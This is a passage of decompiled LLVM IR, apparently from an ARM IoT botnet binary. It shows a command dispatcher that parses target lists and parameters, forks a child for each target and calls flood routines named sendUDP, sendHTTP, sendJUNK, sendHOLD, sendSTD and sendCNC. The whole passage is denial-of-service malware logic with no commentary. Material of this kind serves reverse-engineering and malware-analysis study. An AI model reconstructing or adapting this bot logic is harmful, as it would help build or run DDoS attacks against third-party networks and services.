dec_label_pc_11d90:                               ; preds = %dec_label_pc_11d74, %dec_label_pc_11db8
  %storemerge2851 = phi i32 [ %v2_11dc0, %dec_label_pc_11db8 ], [ %v2_11d80, %dec_label_pc_11d74 ]
  %v0_11d90 = call i32 @listFork()
  %v2_11d98 = icmp eq i32 %v0_11d90, 0
  br i1 %v2_11d98, label %dec_label_pc_11da0, label %dec_label_pc_11db8

dec_label_pc_11da0:                               ; preds = %dec_label_pc_11d90
  %v3_11dac = call i32 @sendHOLD(i32 %storemerge2851, i32 %v1_11d30, i32 %v1_11d4c)
  %v1_11db4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11db8

dec_label_pc_11db8:                               ; preds = %dec_label_pc_11d90, %dec_label_pc_11da0
  %v2_11dc0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_227dc.748 to i32))
  store i32 %v2_11dc0, i32* @r0, align 4
  %v2_11dd0 = icmp eq i32 %v2_11dc0, 0
  br i1 %v2_11dd0, label %dec_label_pc_11e04, label %dec_label_pc_11d90

dec_label_pc_11ddc:                               ; preds = %dec_label_pc_11d10
  %v0_11ddc = call i32 @listFork()
  %v2_11de4 = icmp eq i32 %v0_11ddc, 0
  br i1 %v2_11de4, label %dec_label_pc_11dec, label %dec_label_pc_12d38

dec_label_pc_11dec:                               ; preds = %dec_label_pc_11ddc
  %v3_11df8 = call i32 @sendHOLD(i32 %v2_11d18, i32 %v1_11d30, i32 %v1_11d4c)
  %v1_11e00 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11e04

dec_label_pc_11e04:                               ; preds = %dec_label_pc_11db8, %dec_label_pc_11d74, %dec_label_pc_11ca0, %dec_label_pc_11dec
  %v2_11e08 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_228ac.798 to i32), i32* @r1, align 4
  %v3_11e14 = inttoptr i32 %v2_11e08 to i8*
  %v4_11e14 = call i32 @__GI_strcoll(i8* %v3_11e14, i32 ptrtoint ([5 x i8]* @global_var_228ac.798 to i32))
  %v2_11e1c = icmp eq i32 %v4_11e14, 0
  br i1 %v2_11e1c, label %dec_label_pc_11e24, label %dec_label_pc_11f78

dec_label_pc_11e24:                               ; preds = %dec_label_pc_11e04
  %v7_11e2c = icmp slt i32 %arg1, 4
  br i1 %v7_11e2c, label %dec_label_pc_12d38, label %dec_label_pc_11e30

dec_label_pc_11e30:                               ; preds = %dec_label_pc_11e24
  %v1_11e34 = add i32 %tmp, 8
  %v1_11e38 = inttoptr i32 %v1_11e34 to i32*
  %v2_11e38 = load i32, i32* %v1_11e38, align 4
  store i32 %v2_11e38, i32* @r0, align 4
  %v1_11e40 = call i32 @atol(i32 %v2_11e38)
  %tmp115 = icmp slt i32 %v1_11e40, 1
  br i1 %tmp115, label %dec_label_pc_12d38, label %dec_label_pc_11e50

dec_label_pc_11e50:                               ; preds = %dec_label_pc_11e30
  %v1_11e54 = add i32 %tmp, 12
  %v1_11e58 = inttoptr i32 %v1_11e54 to i32*
  %v2_11e58 = load i32, i32* %v1_11e58, align 4
  store i32 %v2_11e58, i32* @r0, align 4
  %v1_11e60 = call i32 @atol(i32 %v2_11e58)
  %v5_11e6c = icmp sgt i32 %v1_11e60, 0
  br i1 %v5_11e6c, label %dec_label_pc_11e74, label %dec_label_pc_12d38

dec_label_pc_11e74:                               ; preds = %dec_label_pc_11e50
  %v1_11e78 = add i32 %tmp, 4
  %v1_11e7c = inttoptr i32 %v1_11e78 to i32*
  %v2_11e7c = load i32, i32* %v1_11e7c, align 4
  %v2_11e8c = load i32, i32* %v1_11e38, align 4
  store i32 %v2_11e8c, i32* @r0, align 4
  %v1_11e94 = call i32 @atol(i32 %v2_11e8c)
  %v2_11ea8 = load i32, i32* %v1_11e58, align 4
  store i32 %v2_11ea8, i32* @r0, align 4
  %v1_11eb0 = call i32 @atol(i32 %v2_11ea8)
  store i32 %v2_11e7c, i32* @r0, align 4
  %v2_11ec8 = call i32 @__GI_strchr(i32 %v2_11e7c, i32 44)
  store i32 %v2_11ec8, i32* @r0, align 4
  %v2_11ed0 = icmp eq i32 %v2_11ec8, 0
  br i1 %v2_11ed0, label %dec_label_pc_11f50, label %dec_label_pc_11ed8

dec_label_pc_11ed8:                               ; preds = %dec_label_pc_11e74
  %v2_11ee4 = call i32 @__GI_strtok(i32 %v2_11e7c, i32 ptrtoint (i32* @global_var_227dc.748 to i32))
  store i32 %v2_11ee4, i32* @r0, align 4
  %v2_11f4447 = icmp eq i32 %v2_11ee4, 0
  br i1 %v2_11f4447, label %dec_label_pc_11f78, label %dec_label_pc_11ef4

dec_label_pc_11ef4:                               ; preds = %dec_label_pc_11ed8, %dec_label_pc_11f2c
  %storemerge2648 = phi i32 [ %v2_11f34, %dec_label_pc_11f2c ], [ %v2_11ee4, %dec_label_pc_11ed8 ]
  %v0_11ef4 = call i32 @listFork()
  %v2_11efc = icmp eq i32 %v0_11ef4, 0
  br i1 %v2_11efc, label %dec_label_pc_11f04, label %dec_label_pc_11f2c

dec_label_pc_11f04:                               ; preds = %dec_label_pc_11ef4
  %v4_11f10 = call i32 @sendJUNK(i32 %storemerge2648, i32 %v1_11e94, i32 %v1_11eb0, i32 0)
  %v2_11f18 = load i32, i32* @global_var_2c5e8.50, align 4
  %v1_11f20 = call i32 @__GI_close(i32 %v2_11f18)
  %v1_11f28 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11f2c

dec_label_pc_11f2c:                               ; preds = %dec_label_pc_11ef4, %dec_label_pc_11f04
  %v2_11f34 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_227dc.748 to i32))
  store i32 %v2_11f34, i32* @r0, align 4
  %v2_11f44 = icmp eq i32 %v2_11f34, 0
  br i1 %v2_11f44, label %dec_label_pc_11f78, label %dec_label_pc_11ef4

dec_label_pc_11f50:                               ; preds = %dec_label_pc_11e74
  %v0_11f50 = call i32 @listFork()
  %v2_11f58 = icmp eq i32 %v0_11f50, 0
  br i1 %v2_11f58, label %dec_label_pc_11f60, label %dec_label_pc_12d38

dec_label_pc_11f60:                               ; preds = %dec_label_pc_11f50
  %v4_11f6c = call i32 @sendJUNK(i32 %v2_11e7c, i32 %v1_11e94, i32 %v1_11eb0, i32 0)
  %v1_11f74 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11f78

dec_label_pc_11f78:                               ; preds = %dec_label_pc_11f2c, %dec_label_pc_11ed8, %dec_label_pc_11e04, %dec_label_pc_11f60
  %v2_11f7c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_228b4.800 to i32), i32* @r1, align 4
  %v3_11f88 = inttoptr i32 %v2_11f7c to i8*
  %v4_11f88 = call i32 @__GI_strcoll(i8* %v3_11f88, i32 ptrtoint ([4 x i8]* @global_var_228b4.800 to i32))
  %v2_11f90 = icmp eq i32 %v4_11f88, 0
  br i1 %v2_11f90, label %dec_label_pc_11f98, label %dec_label_pc_12228

dec_label_pc_11f98:                               ; preds = %dec_label_pc_11f78
  %v7_11fa0 = icmp slt i32 %arg1, 6
  br i1 %v7_11fa0, label %dec_label_pc_12d38, label %dec_label_pc_11fa4

dec_label_pc_11fa4:                               ; preds = %dec_label_pc_11f98
  %v1_11fa8 = add i32 %tmp, 12
  %v1_11fac = inttoptr i32 %v1_11fa8 to i32*
  %v2_11fac = load i32, i32* %v1_11fac, align 4
  store i32 %v2_11fac, i32* @r0, align 4
  %v1_11fb4 = call i32 @atol(i32 %v2_11fac)
  %v7_11fbc = icmp eq i32 %v1_11fb4, -1
  br i1 %v7_11fbc, label %dec_label_pc_12d38, label %dec_label_pc_11fc4

dec_label_pc_11fc4:                               ; preds = %dec_label_pc_11fa4
  %v1_11fc8 = add i32 %tmp, 8
  %v1_11fcc = inttoptr i32 %v1_11fc8 to i32*
  %v2_11fcc = load i32, i32* %v1_11fcc, align 4
  store i32 %v2_11fcc, i32* @r0, align 4
  %v1_11fd4 = call i32 @atol(i32 %v2_11fcc)
  %v7_11fdc = icmp eq i32 %v1_11fd4, -1
  br i1 %v7_11fdc, label %dec_label_pc_12d38, label %dec_label_pc_11fe4

dec_label_pc_11fe4:                               ; preds = %dec_label_pc_11fc4
  %v1_11fe8 = add i32 %tmp, 16
  %v1_11fec = inttoptr i32 %v1_11fe8 to i32*
  %v2_11fec = load i32, i32* %v1_11fec, align 4
  store i32 %v2_11fec, i32* @r0, align 4
  %v1_11ff4 = call i32 @atol(i32 %v2_11fec)
  %v7_11ffc = icmp eq i32 %v1_11ff4, -1
  br i1 %v7_11ffc, label %dec_label_pc_12d38, label %dec_label_pc_12004

dec_label_pc_12004:                               ; preds = %dec_label_pc_11fe4
  %v1_12008 = add i32 %tmp, 20
  %v1_1200c = inttoptr i32 %v1_12008 to i32*
  %v2_1200c = load i32, i32* %v1_1200c, align 4
  store i32 %v2_1200c, i32* @r0, align 4
  %v1_12014 = call i32 @atol(i32 %v2_1200c)
  %v7_1201c = icmp eq i32 %v1_12014, -1
  br i1 %v7_1201c, label %dec_label_pc_12d38, label %dec_label_pc_12024

dec_label_pc_12024:                               ; preds = %dec_label_pc_12004
  %v2_1202c = load i32, i32* %v1_1200c, align 4
  store i32 %v2_1202c, i32* @r0, align 4
  %v1_12034 = call i32 @atol(i32 %v2_1202c)
  %v8_12048 = icmp sgt i32 %v1_12034, 65500
  br i1 %v8_12048, label %dec_label_pc_12d38, label %dec_label_pc_1204c

dec_label_pc_1204c:                               ; preds = %dec_label_pc_12024
  %v2_12054 = load i32, i32* %v1_11fec, align 4
  store i32 %v2_12054, i32* @r0, align 4
  %v1_1205c = call i32 @atol(i32 %v2_12054)
  %v8_12068 = icmp sgt i32 %v1_1205c, 32
  br i1 %v8_12068, label %dec_label_pc_12d38, label %dec_label_pc_1206c

dec_label_pc_1206c:                               ; preds = %dec_label_pc_1204c
  %v7_12070 = icmp eq i32 %arg1, 7
  br i1 %v7_12070, label %dec_label_pc_12078, label %dec_label_pc_1209c

dec_label_pc_12078:                               ; preds = %dec_label_pc_1206c
  %v1_1207c = add i32 %tmp, 24
  %v1_12080 = inttoptr i32 %v1_1207c to i32*
  %v2_12080 = load i32, i32* %v1_12080, align 4
  store i32 %v2_12080, i32* @r0, align 4
  %v1_12088 = call i32 @atol(i32 %v2_12080)
  %v5_12094 = icmp sgt i32 %v1_12088, 0
  br i1 %v5_12094, label %dec_label_pc_1209c, label %dec_label_pc_12d38

dec_label_pc_1209c:                               ; preds = %dec_label_pc_1206c, %dec_label_pc_12078
  %v1_120a0 = add i32 %tmp, 4
  %v1_120a4 = inttoptr i32 %v1_120a0 to i32*
  %v2_120a4 = load i32, i32* %v1_120a4, align 4
  %v2_120b4 = load i32, i32* %v1_11fcc, align 4
  store i32 %v2_120b4, i32* @r0, align 4
  %v1_120bc = call i32 @atol(i32 %v2_120b4)
  %v2_120d0 = load i32, i32* %v1_11fac, align 4
  store i32 %v2_120d0, i32* @r0, align 4
  %v1_120d8 = call i32 @atol(i32 %v2_120d0)
  %v2_120ec = load i32, i32* %v1_11fec, align 4
  store i32 %v2_120ec, i32* @r0, align 4
  %v1_120f4 = call i32 @atol(i32 %v2_120ec)
  %v2_12108 = load i32, i32* %v1_1200c, align 4
  store i32 %v2_12108, i32* @r0, align 4
  %v1_12110 = call i32 @atol(i32 %v2_12108)
  br i1 %v7_12070, label %dec_label_pc_12128, label %dec_label_pc_12144

dec_label_pc_12128:                               ; preds = %dec_label_pc_1209c
  %v1_1212c = add i32 %tmp, 24
  %v1_12130 = inttoptr i32 %v1_1212c to i32*
  %v2_12130 = load i32, i32* %v1_12130, align 4
  store i32 %v2_12130, i32* @r0, align 4
  %v1_12138 = call i32 @atol(i32 %v2_12130)
  br label %dec_label_pc_1214c

dec_label_pc_12144:                               ; preds = %dec_label_pc_1209c
  br label %dec_label_pc_1214c

dec_label_pc_1214c:                               ; preds = %dec_label_pc_12128, %dec_label_pc_12144
  %storemerge9 = phi i32 [ 10, %dec_label_pc_12144 ], [ %v1_12138, %dec_label_pc_12128 ]
  store i32 %v2_120a4, i32* @r0, align 4
  %v2_12160 = call i32 @__GI_strchr(i32 %v2_120a4, i32 44)
  store i32 %v2_12160, i32* @r0, align 4
  %v2_12168 = icmp eq i32 %v2_12160, 0
  br i1 %v2_12168, label %dec_label_pc_121ec, label %dec_label_pc_12170

dec_label_pc_12170:                               ; preds = %dec_label_pc_1214c
  %v2_1217c = call i32 @__GI_strtok(i32 %v2_120a4, i32 ptrtoint (i32* @global_var_227dc.748 to i32))
  store i32 %v2_1217c, i32* @r0, align 4
  %v2_121e044 = icmp eq i32 %v2_1217c, 0
  br i1 %v2_121e044, label %dec_label_pc_12228, label %dec_label_pc_1218c

dec_label_pc_1218c:                               ; preds = %dec_label_pc_12170, %dec_label_pc_121c8
  %storemerge2445 = phi i32 [ %v2_121d0, %dec_label_pc_121c8 ], [ %v2_1217c, %dec_label_pc_12170 ]
  %v0_1218c = call i32 @listFork()
  %v2_12194 = icmp eq i32 %v0_1218c, 0
  br i1 %v2_12194, label %dec_label_pc_1219c, label %dec_label_pc_121c8

dec_label_pc_1219c:                               ; preds = %dec_label_pc_1218c
  %v6_121bc = call i32 @sendUDP(i32 %storemerge2445, i32 %v1_120bc, i32 %v1_120d8, i32 %v1_120f4, i32 %v1_12110, i32 %storemerge9)
  %v1_121c4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_121c8

dec_label_pc_121c8:                               ; preds = %dec_label_pc_1218c, %dec_label_pc_1219c
  %v2_121d0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_227dc.748 to i32))
  store i32 %v2_121d0, i32* @r0, align 4
  %v2_121e0 = icmp eq i32 %v2_121d0, 0
  br i1 %v2_121e0, label %dec_label_pc_12228, label %dec_label_pc_1218c

dec_label_pc_121ec:                               ; preds = %dec_label_pc_1214c
  %v0_121ec = call i32 @listFork()
  %v2_121f4 = icmp eq i32 %v0_121ec, 0
  br i1 %v2_121f4, label %dec_label_pc_121fc, label %dec_label_pc_12d38

dec_label_pc_121fc:                               ; preds = %dec_label_pc_121ec
  %v6_1221c = call i32 @sendUDP(i32 %v2_120a4, i32 %v1_120bc, i32 %v1_120d8, i32 %v1_120f4, i32 %v1_12110, i32 %storemerge9)
  %v1_12224 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_12228

dec_label_pc_12228:                               ; preds = %dec_label_pc_121c8, %dec_label_pc_12170, %dec_label_pc_11f78, %dec_label_pc_121fc
  %v2_1222c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_228b8.802 to i32), i32* @r1, align 4
  %v3_12238 = inttoptr i32 %v2_1222c to i8*
  %v4_12238 = call i32 @__GI_strcoll(i8* %v3_12238, i32 ptrtoint ([5 x i8]* @global_var_228b8.802 to i32))
  %v2_12240 = icmp eq i32 %v4_12238, 0
  br i1 %v2_12240, label %dec_label_pc_12248, label %dec_label_pc_12420

dec_label_pc_12248:                               ; preds = %dec_label_pc_12228
  %v7_12250 = icmp slt i32 %arg1, 6
  br i1 %v7_12250, label %dec_label_pc_12d38, label %dec_label_pc_12254

dec_label_pc_12254:                               ; preds = %dec_label_pc_12248
  %v1_12258 = add i32 %tmp, 4
  %v1_1225c = inttoptr i32 %v1_12258 to i32*
  %v2_1225c = load i32, i32* %v1_1225c, align 4
  store i32 %v2_1225c, i32* @r0, align 4
  %v2_12268 = call i32 @__GI_strchr(i32 %v2_1225c, i32 44)
  store i32 %v2_12268, i32* @r0, align 4
  %v2_12270 = icmp eq i32 %v2_12268, 0
  br i1 %v2_12270, label %dec_label_pc_12370, label %dec_label_pc_12278

dec_label_pc_12278:                               ; preds = %dec_label_pc_12254
  %v2_12280 = load i32, i32* %v1_1225c, align 4
  %v2_1228c = call i32 @__GI_strtok(i32 %v2_12280, i32 ptrtoint (i32* @global_var_227dc.748 to i32))
  store i32 %v2_1228c, i32* @r0, align 4
  %v2_1236442 = icmp eq i32 %v2_1228c, 0
  br i1 %v2_1236442, label %dec_label_pc_12420, label %dec_label_pc_1229c.lr.ph

dec_label_pc_1229c.lr.ph:                         ; preds = %dec_label_pc_12278
  %v1_122bc = add i32 %tmp, 8
  %v1_122c0 = inttoptr i32 %v1_122bc to i32*
  %v1_122cc = add i32 %tmp, 12
  %v1_122d0 = inttoptr i32 %v1_122cc to i32*
  %v1_122ec = add i32 %tmp, 16
  %v1_122f0 = inttoptr i32 %v1_122ec to i32*
  %v1_122fc = add i32 %tmp, 20
  %v1_12300 = inttoptr i32 %v1_122fc to i32*
  %v1_12314 = add i32 %tmp, 24
  %v1_12318 = inttoptr i32 %v1_12314 to i32*
  br label %dec_label_pc_1229c

dec_label_pc_1229c:                               ; preds = %dec_label_pc_1229c.lr.ph, %dec_label_pc_1234c
  %v0_1229c = call i32 @listFork()
  %v2_122a4 = icmp eq i32 %v0_1229c, 0
  br i1 %v2_122a4, label %dec_label_pc_122ac, label %dec_label_pc_1234c

dec_label_pc_122ac:                               ; preds = %dec_label_pc_1229c
  %v2_122b4 = load i32, i32* %v1_1225c, align 4
  store i32 %v2_122b4, i32* @r5, align 4
  %v2_122c0 = load i32, i32* %v1_122c0, align 4
  store i32 %v2_122c0, i32* @r6, align 4
  %v2_122d0 = load i32, i32* %v1_122d0, align 4
  store i32 %v2_122d0, i32* @r0, align 4
  %v1_122d8 = call i32 @atol(i32 %v2_122d0)
  %v3_122e4 = urem i32 %v1_122d8, 65536
  store i32 %v3_122e4, i32* @r7, align 4
  %v2_122f0 = load i32, i32* %v1_122f0, align 4
  store i32 %v2_122f0, i32* @r8, align 4
  %v2_12300 = load i32, i32* %v1_12300, align 4
  store i32 %v2_12300, i32* @r0, align 4
  %v1_12308 = call i32 @atol(i32 %v2_12300)
  store i32 %v1_12308, i32* @r4, align 4
  %v2_12318 = load i32, i32* %v1_12318, align 4
  store i32 %v2_12318, i32* @r0, align 4
  %v1_12320 = call i32 @atol(i32 %v2_12318)
  %v0_12328 = load i32, i32* @r4, align 4
  %v0_12330 = load i32, i32* @r5, align 4
  %v0_12334 = load i32, i32* @r6, align 4
  %v0_12338 = load i32, i32* @r7, align 4
  %v0_1233c = load i32, i32* @r8, align 4
  %v6_12340 = trunc i32 %v0_12338 to i16
  %v7_12340 = call i32 @sendHTTP(i32 %v0_12330, i32 %v0_12334, i16 %v6_12340, i32 %v0_1233c, i32 %v0_12328, i32 %v1_12320)
  %v1_12348 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1234c

dec_label_pc_1234c:                               ; preds = %dec_label_pc_1229c, %dec_label_pc_122ac
  %v2_12354 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_227dc.748 to i32))
  store i32 %v2_12354, i32* @r0, align 4
  %v2_12364 = icmp eq i32 %v2_12354, 0
  br i1 %v2_12364, label %dec_label_pc_12420, label %dec_label_pc_1229c

dec_label_pc_12370:                               ; preds = %dec_label_pc_12254
  %v0_12370 = call i32 @listFork()
  %v2_12378 = icmp eq i32 %v0_12370, 0
  br i1 %v2_12378, label %dec_label_pc_12380, label %dec_label_pc_12d38

dec_label_pc_12380:                               ; preds = %dec_label_pc_12370
  %v2_12388 = load i32, i32* %v1_1225c, align 4
  store i32 %v2_12388, i32* @r5, align 4
  %v1_12390 = add i32 %tmp, 8
  %v1_12394 = inttoptr i32 %v1_12390 to i32*
  %v2_12394 = load i32, i32* %v1_12394, align 4
  store i32 %v2_12394, i32* @r6, align 4
  %v1_123a0 = add i32 %tmp, 12
  %v1_123a4 = inttoptr i32 %v1_123a0 to i32*
  %v2_123a4 = load i32, i32* %v1_123a4, align 4
  store i32 %v2_123a4, i32* @r0, align 4
  %v1_123ac = call i32 @atol(i32 %v2_123a4)
  %v3_123b8 = urem i32 %v1_123ac, 65536
  store i32 %v3_123b8, i32* @r7, align 4
  %v1_123c0 = add i32 %tmp, 16
  %v1_123c4 = inttoptr i32 %v1_123c0 to i32*
  %v2_123c4 = load i32, i32* %v1_123c4, align 4
  store i32 %v2_123c4, i32* @r8, align 4
  %v1_123d0 = add i32 %tmp, 20
  %v1_123d4 = inttoptr i32 %v1_123d0 to i32*
  %v2_123d4 = load i32, i32* %v1_123d4, align 4
  store i32 %v2_123d4, i32* @r0, align 4
  %v1_123dc = call i32 @atol(i32 %v2_123d4)
  store i32 %v1_123dc, i32* @r4, align 4
  %v1_123e8 = add i32 %tmp, 24
  %v1_123ec = inttoptr i32 %v1_123e8 to i32*
  %v2_123ec = load i32, i32* %v1_123ec, align 4
  store i32 %v2_123ec, i32* @r0, align 4
  %v1_123f4 = call i32 @atol(i32 %v2_123ec)
  %v0_123fc = load i32, i32* @r4, align 4
  %v0_12404 = load i32, i32* @r5, align 4
  %v0_12408 = load i32, i32* @r6, align 4
  %v0_1240c = load i32, i32* @r7, align 4
  %v0_12410 = load i32, i32* @r8, align 4
  %v6_12414 = trunc i32 %v0_1240c to i16
  %v7_12414 = call i32 @sendHTTP(i32 %v0_12404, i32 %v0_12408, i16 %v6_12414, i32 %v0_12410, i32 %v0_123fc, i32 %v1_123f4)
  %v1_1241c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_12420

dec_label_pc_12420:                               ; preds = %dec_label_pc_1234c, %dec_label_pc_12278, %dec_label_pc_12228, %dec_label_pc_12380
  %v2_12424 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_228c0.804 to i32), i32* @r1, align 4
  %v3_12430 = inttoptr i32 %v2_12424 to i8*
  %v4_12430 = call i32 @__GI_strcoll(i8* %v3_12430, i32 ptrtoint ([4 x i8]* @global_var_228c0.804 to i32))
  %v2_12438 = icmp eq i32 %v4_12430, 0
  br i1 %v2_12438, label %dec_label_pc_12440, label %dec_label_pc_12594

dec_label_pc_12440:                               ; preds = %dec_label_pc_12420
  %v7_12448 = icmp slt i32 %arg1, 4
  br i1 %v7_12448, label %dec_label_pc_12d38, label %dec_label_pc_1244c

dec_label_pc_1244c:                               ; preds = %dec_label_pc_12440
  %v1_12450 = add i32 %tmp, 8
  %v1_12454 = inttoptr i32 %v1_12450 to i32*
  %v2_12454 = load i32, i32* %v1_12454, align 4
  store i32 %v2_12454, i32* @r0, align 4
  %v1_1245c = call i32 @atol(i32 %v2_12454)
  %tmp117 = icmp slt i32 %v1_1245c, 1
  br i1 %tmp117, label %dec_label_pc_12d38, label %dec_label_pc_1246c

dec_label_pc_1246c:                               ; preds = %dec_label_pc_1244c
  %v1_12470 = add i32 %tmp, 12
  %v1_12474 = inttoptr i32 %v1_12470 to i32*
  %v2_12474 = load i32, i32* %v1_12474, align 4
  store i32 %v2_12474, i32* @r0, align 4
  %v1_1247c = call i32 @atol(i32 %v2_12474)
  %v5_12488 = icmp sgt i32 %v1_1247c, 0
  br i1 %v5_12488, label %dec_label_pc_12490, label %dec_label_pc_12d38

dec_label_pc_12490:                               ; preds = %dec_label_pc_1246c
  %v1_12494 = add i32 %tmp, 4
  %v1_12498 = inttoptr i32 %v1_12494 to i32*
  %v2_12498 = load i32, i32* %v1_12498, align 4
  %v2_124a8 = load i32, i32* %v1_12454, align 4
  store i32 %v2_124a8, i32* @r0, align 4
  %v1_124b0 = call i32 @atol(i32 %v2_124a8)
  %v2_124c4 = load i32, i32* %v1_12474, align 4
  store i32 %v2_124c4, i32* @r0, align 4
  %v1_124cc = call i32 @atol(i32 %v2_124c4)
  store i32 %v2_12498, i32* @r0, align 4
  %v2_124e4 = call i32 @__GI_strchr(i32 %v2_12498, i32 44)
  store i32 %v2_124e4, i32* @r0, align 4
  %v2_124ec = icmp eq i32 %v2_124e4, 0
  br i1 %v2_124ec, label %dec_label_pc_1256c, label %dec_label_pc_124f4

dec_label_pc_124f4:                               ; preds = %dec_label_pc_12490
  %v2_12500 = call i32 @__GI_strtok(i32 %v2_12498, i32 ptrtoint (i32* @global_var_227dc.748 to i32))
  store i32 %v2_12500, i32* @r0, align 4
  %v2_1256039 = icmp eq i32 %v2_12500, 0
  br i1 %v2_1256039, label %dec_label_pc_12594, label %dec_label_pc_12510

dec_label_pc_12510:                               ; preds = %dec_label_pc_124f4, %dec_label_pc_12548
  %storemerge2040 = phi i32 [ %v2_12550, %dec_label_pc_12548 ], [ %v2_12500, %dec_label_pc_124f4 ]
  %v0_12510 = call i32 @listFork()
  %v2_12518 = icmp eq i32 %v0_12510, 0
  br i1 %v2_12518, label %dec_label_pc_12520, label %dec_label_pc_12548

dec_label_pc_12520:                               ; preds = %dec_label_pc_12510
  %v4_1252c = call i32 @sendCNC(i32 %storemerge2040, i32 %v1_124b0, i32 %v1_124cc, i32 0)
  %v2_12534 = load i32, i32* @global_var_2c5e8.50, align 4
  %v1_1253c = call i32 @__GI_close(i32 %v2_12534)
  %v1_12544 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_12548

dec_label_pc_12548:                               ; preds = %dec_label_pc_12510, %dec_label_pc_12520
  %v2_12550 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_227dc.748 to i32))
  store i32 %v2_12550, i32* @r0, align 4
  %v2_12560 = icmp eq i32 %v2_12550, 0
  br i1 %v2_12560, label %dec_label_pc_12594, label %dec_label_pc_12510

dec_label_pc_1256c:                               ; preds = %dec_label_pc_12490
  %v0_1256c = call i32 @listFork()
  %v2_12574 = icmp eq i32 %v0_1256c, 0
  br i1 %v2_12574, label %dec_label_pc_1257c, label %dec_label_pc_12d38

dec_label_pc_1257c:                               ; preds = %dec_label_pc_1256c
  %v4_12588 = call i32 @sendCNC(i32 %v2_12498, i32 %v1_124b0, i32 %v1_124cc, i32 0)
  %v1_12590 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_12594

dec_label_pc_12594:                               ; preds = %dec_label_pc_12548, %dec_label_pc_124f4, %dec_label_pc_12420, %dec_label_pc_1257c
  %v2_12598 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_228c4.806 to i32), i32* @r1, align 4
  %v3_125a4 = inttoptr i32 %v2_12598 to i8*
  %v4_125a4 = call i32 @__GI_strcoll(i8* %v3_125a4, i32 ptrtoint ([6 x i8]* @global_var_228c4.806 to i32))
  %v2_125ac = icmp eq i32 %v4_125a4, 0
  br i1 %v2_125ac, label %dec_label_pc_125b4, label %dec_label_pc_12748

dec_label_pc_125b4:                               ; preds = %dec_label_pc_12594
  %v7_125bc = icmp slt i32 %arg1, 4
  br i1 %v7_125bc, label %dec_label_pc_12d38, label %dec_label_pc_125c0

dec_label_pc_125c0:                               ; preds = %dec_label_pc_125b4
  %v1_125c4 = add i32 %tmp, 8
  %v1_125c8 = inttoptr i32 %v1_125c4 to i32*
  %v2_125c8 = load i32, i32* %v1_125c8, align 4
  store i32 %v2_125c8, i32* @r0, align 4
  %v1_125d0 = call i32 @atol(i32 %v2_125c8)
  %tmp118 = icmp slt i32 %v1_125d0, 1
  br i1 %tmp118, label %dec_label_pc_12d38, label %dec_label_pc_125e0

dec_label_pc_125e0:                               ; preds = %dec_label_pc_125c0
  %v1_125e4 = add i32 %tmp, 12
  %v1_125e8 = inttoptr i32 %v1_125e4 to i32*
  %v2_125e8 = load i32, i32* %v1_125e8, align 4
  store i32 %v2_125e8, i32* @r0, align 4
  %v1_125f0 = call i32 @atol(i32 %v2_125e8)
  %v5_125fc = icmp sgt i32 %v1_125f0, 0
  br i1 %v5_125fc, label %dec_label_pc_12604, label %dec_label_pc_12d38

dec_label_pc_12604:                               ; preds = %dec_label_pc_125e0
  %v1_12608 = add i32 %tmp, 4
  %v1_1260c = inttoptr i32 %v1_12608 to i32*
  %v2_1260c = load i32, i32* %v1_1260c, align 4
  %v2_1261c = load i32, i32* %v1_125c8, align 4
  store i32 %v2_1261c, i32* @r0, align 4
  %v1_12624 = call i32 @atol(i32 %v2_1261c)
  %v2_12638 = load i32, i32* %v1_125e8, align 4
  store i32 %v2_12638, i32* @r0, align 4
  %v1_12640 = call i32 @atol(i32 %v2_12638)
  store i32 %v2_1260c, i32* @r0, align 4
  %v2_12658 = call i32 @__GI_strchr(i32 %v2_1260c, i32 44)
  store i32 %v2_12658, i32* @r0, align 4
  %v2_12660 = icmp eq i32 %v2_12658, 0
  br i1 %v2_12660, label %dec_label_pc_12700, label %dec_label_pc_12668

dec_label_pc_12668:                               ; preds = %dec_label_pc_12604
  %v2_12674 = call i32 @__GI_strtok(i32 %v2_1260c, i32 ptrtoint (i32* @global_var_227dc.748 to i32))
  store i32 %v2_12674, i32* @r0, align 4
  %v2_126f436 = icmp eq i32 %v2_12674, 0
  br i1 %v2_126f436, label %dec_label_pc_12748, label %dec_label_pc_12684

dec_label_pc_12684:                               ; preds = %dec_label_pc_12668, %dec_label_pc_126dc
  %storemerge1837 = phi i32 [ %v2_126e4, %dec_label_pc_126dc ], [ %v2_12674, %dec_label_pc_12668 ]
  %v0_12684 = call i32 @listFork()
  %v2_1268c = icmp eq i32 %v0_12684, 0
  br i1 %v2_1268c, label %dec_label_pc_12694, label %dec_label_pc_126dc

dec_label_pc_12694:                               ; preds = %dec_label_pc_12684
  %v4_126a0 = call i32 @sendJUNK(i32 %storemerge1837, i32 %v1_12624, i32 %v1_12640, i32 0)
  %v3_126b0 = call i32 @sendSTD(i32 %storemerge1837, i32 %v1_12624, i32 %v1_12640)
  %v3_126c0 = call i32 @sendHOLD(i32 %storemerge1837, i32 %v1_12624, i32 %v1_12640)
  %v2_126c8 = load i32, i32* @global_var_2c5e8.50, align 4
  %v1_126d0 = call i32 @__GI_close(i32 %v2_126c8)
  %v1_126d8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_126dc

dec_label_pc_126dc:                               ; preds = %dec_label_pc_12684, %dec_label_pc_12694
